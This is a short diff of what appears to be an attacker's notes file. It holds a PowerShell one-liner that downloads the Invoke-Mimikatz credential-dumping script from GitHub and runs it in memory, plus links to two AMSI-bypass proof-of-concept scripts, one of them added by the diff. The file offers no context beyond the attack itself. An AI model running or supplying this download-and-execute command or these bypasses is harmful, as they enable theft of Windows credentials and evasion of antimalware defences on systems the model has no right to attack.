@@ -1,2 +1,6 @@
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowershellMafia/Powersploit/refs/heads/master/Exfiltration/Invoke-Mimikatz.ps1')
 https://github.com/V-i-x-x/AMSI-BYPASS/blob/main/POC.ps1
+
+
+
+https://github.com/ASP4RUX/Invoke-AMSI/blob/main/Invoke-ASAMSI.ps1
